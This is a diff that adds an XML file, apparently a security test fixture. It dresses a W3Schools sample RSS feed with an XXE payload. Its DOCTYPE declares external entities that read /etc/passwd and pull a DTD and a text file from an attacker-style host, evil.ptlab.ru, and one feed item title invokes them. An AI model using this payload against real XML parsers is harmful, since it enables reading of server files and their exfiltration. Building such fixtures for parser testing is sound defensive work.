@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE d [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://evil.ptlab.ru/join.dtd">
+<!ENTITY % sample SYSTEM "http://evil.ptlab.ru/sample.txt">
+]>
+<rss version="2.0">
+    <channel>
+        <title>W3Schools Home Page</title>
+        <link>https://www.w3schools.com</link>
+        <description>Free web building tutorials</description>
+        <item>
+            <title>&sample;</title>
+            <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+            <description>New RSS tutorial on W3Schools</description>
+        </item>
+    </channel>
+</rss>
